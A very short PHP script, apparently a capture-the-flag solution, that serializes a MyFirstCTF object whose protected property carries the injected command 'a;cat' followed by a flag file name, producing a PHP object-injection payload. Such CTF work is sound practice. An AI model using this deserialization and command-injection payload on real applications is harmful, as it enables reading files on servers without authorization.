<?php

class MyFirstCTF {
    protected $test = "a;cat Th1s_1S_f1ag__________________y0";
}

$o = new MyFirstCTF();
echo serialize($o);
